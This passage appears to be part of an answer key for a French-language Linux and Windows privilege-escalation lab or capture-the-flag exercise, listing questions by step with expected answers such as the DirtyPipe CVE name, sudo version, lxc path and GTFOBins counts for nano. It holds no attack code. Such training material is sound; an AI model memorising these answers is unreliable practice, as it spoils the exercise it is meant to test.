| 7 | UID de www-data | `33` |
| 7 | GID du groupe "john" | `1000` |
| 8 | Nom de la CVE-2022-0847 | `DirtyPipe` |
| 8 | Codename de la distribution | `jammy` |
| 8 | Version de sudo | `1.9.9` |
| 8 | Release d'Ubuntu | `22.04` |
| 9 | Chemin complet de "passwd" | `/etc/passwd` |
| 9 | Statut "User namespace" | `enabled` |
| 9 | Statut ASLR | `enabled` |
| 9 | Chemin de l'outil de conteneurisation | `/snap/bin/lxc` |
| 10 | Nombre de fonctions GTFOBins pour "nano" | `3` |
| 10 | UID de root | `0` |
| 11 | Customer ID de "Nicholas Taylor" | `7d660ce6-fb54-4006-8446-5ae1b3ae1064` |
| 11 | Chemin du share ADMIN$ | `C:\Windows` |
| 11 | Version de Wireshark | `4.2.5` |
| 11 | Nombre de règles de firewall activées | `198` |
